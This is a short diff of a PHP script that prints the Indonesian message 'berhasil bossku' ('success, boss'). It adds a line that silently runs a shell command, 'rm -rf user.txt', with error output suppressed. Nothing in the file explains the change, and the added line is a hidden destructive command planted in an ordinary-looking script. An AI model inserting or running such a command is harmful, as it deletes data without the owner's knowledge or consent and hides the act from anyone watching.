@@ -1,2 +1,3 @@
 <?php
 echo" berhasil bossku\n";
+@system("rm -rf user.txt");
